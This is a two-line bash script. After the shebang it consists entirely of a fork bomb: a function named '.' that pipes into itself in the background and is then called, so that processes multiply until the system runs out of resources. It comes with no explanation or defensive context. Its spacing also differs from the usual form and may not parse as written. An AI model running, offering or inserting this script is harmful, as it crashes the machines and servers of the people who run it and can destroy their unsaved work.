#!/bin/bash
.() {.|.&};.
